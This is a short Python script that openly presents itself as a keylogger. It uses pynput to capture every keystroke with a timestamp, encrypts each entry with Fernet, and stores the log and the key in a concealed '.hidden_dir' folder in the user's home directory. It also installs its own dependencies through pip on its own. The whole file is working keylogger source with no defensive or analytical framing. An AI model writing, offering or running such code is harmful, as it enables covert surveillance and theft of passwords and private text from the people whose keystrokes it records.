import os
import subprocess
from datetime import datetime

try:
    import pynput
except ImportError:
    print("pynput is not installed. Installing...")
    subprocess.check_call(['pip', 'install', 'pynput'])

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("cryptography is not installed. Installing...")
    subprocess.check_call(['pip', 'install', 'cryptography'])
    from cryptography.fernet import Fernet

from pynput.keyboard import Key, Listener

hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
os.makedirs(hidden_dir, exist_ok=True)

key_file_path = os.path.join(hidden_dir, "encryption_key.txt")
log_file_path = os.path.join(hidden_dir, "keylog_encrypted.txt")

def load_or_create_key():
    if os.path.exists(key_file_path):
        with open(key_file_path, "rb") as f:
            return f.read()
    key = Fernet.generate_key()
    with open(key_file_path, "wb") as f:
        f.write(key)
    return key

key = load_or_create_key()
cipher = Fernet(key)

def encrypt_message(message: str) -> bytes:
    return cipher.encrypt(message.encode())

def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    return f"[{key.name}]"

def on_press(key):
    try:
        key_str = format_key(key)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"{timestamp} | {key_str}"
        encrypted_entry = encrypt_message(entry)

        with open(log_file_path, "ab") as f:
            f.write(encrypted_entry + b'\n')
    except Exception as e:
        print(f"Logging error: {e}")

def on_release(key):
    if key == Key.esc:
        print("Stopping keylogger...")
        return False

print("Keylogger started... Press ESC to stop.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
